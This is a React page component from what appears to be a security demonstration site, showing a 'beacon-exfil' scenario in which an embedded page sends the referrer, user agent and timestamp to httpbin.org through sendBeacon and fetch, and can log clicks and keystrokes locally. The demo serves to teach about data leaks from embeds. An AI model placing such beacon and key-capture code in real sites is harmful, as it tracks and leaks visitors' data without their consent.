"use client";

import { useEffect, useState } from "react";
import { findScenario } from "@/lib/scenarios";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { EmbedSnippet } from "@/app/EmbedSnippet";
import { Log, useLog } from "@/app/Log";
import { I18N } from "./i18n";
import { fmt, usePageI18n } from "../usePageI18n";

const EXFIL_ENDPOINT = "https://httpbin.org/post";

const BeaconExfilPage = () => {
  const scenario = findScenario("beacon-exfil")!;
  const { lines, push, clear } = useLog();
  const [tracking, setTracking] = useState(false);
  const t = usePageI18n(I18N);

  useEffect(() => {
    if (!tracking) return;
    const onClick = (e: MouseEvent) => {
      push(fmt(t.log.clickCapture, { x: e.clientX, y: e.clientY }));
    };
    const onKey = (e: KeyboardEvent) => {
      push(fmt(t.log.keyCapture, { key: e.key }));
    };
    window.addEventListener("click", onClick);
    window.addEventListener("keydown", onKey);
    return () => {
      window.removeEventListener("click", onClick);
      window.removeEventListener("keydown", onKey);
    };
  }, [tracking, push]);

  const sendBeacon = () => {
    const payload = {
      ts: Date.now(),
      referrer: document.referrer,
      ua: navigator.userAgent,
      lang: navigator.language,
      // Cross-origin parent origin cannot be read directly, but referrer may expose it.
    };
    push(fmt(t.log.sendingBeacon, { endpoint: EXFIL_ENDPOINT }));
    const ok = navigator.sendBeacon(
      EXFIL_ENDPOINT,
      new Blob([JSON.stringify(payload)], { type: "application/json" })
    );
    push(fmt(t.log.beaconResult, { result: ok ? "queued" : "failed" }));
  };

  const sendFetch = async () => {
    push(fmt(t.log.sendingFetch, { endpoint: EXFIL_ENDPOINT }));
    try {
      const res = await fetch(EXFIL_ENDPOINT, {
        method: "POST",
        mode: "cors",
        body: JSON.stringify({
          referrer: document.referrer,
          ua: navigator.userAgent,
          ts: Date.now(),
        }),
      });
      push(fmt(t.log.fetchStatus, { status: res.status }));
    } catch (e) {
      push(fmt(t.log.failed, { message: (e as Error).message }));
    }
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="beacon-exfil" />

      <h2>{t.actionsHeading}</h2>
      <div className="kv">
        <div className="k">{t.text.referrerLabel}</div>
        <div>
          <code>
            {typeof window === "undefined" ? "-" : document.referrer || t.log.empty}
          </code>
        </div>
        <div className="k">{t.text.uaLabel}</div>
        <div>
          <code>{typeof window === "undefined" ? "-" : navigator.userAgent}</code>
        </div>
      </div>
      <div className="actions">
        <button className="danger" onClick={sendBeacon}>
          {t.buttons.beacon}
        </button>
        <button className="danger" onClick={sendFetch}>
          {t.buttons.fetch}
        </button>
        <button
          className={tracking ? "danger" : ""}
          onClick={() => setTracking((t) => !t)}
        >
          {tracking ? t.buttons.trackingOff : t.buttons.trackingOn}
        </button>
        <button onClick={clear}>{t.buttons.clearLog}</button>
      </div>
      <Log lines={lines} />

      <h2>{t.explanationHeading}</h2>
      <ul>
        {(t.explanation ?? []).map((html, i) => (
          <li key={i} dangerouslySetInnerHTML={{ __html: html }} />
        ))}
      </ul>
    </>
  );
};

export default BeaconExfilPage;
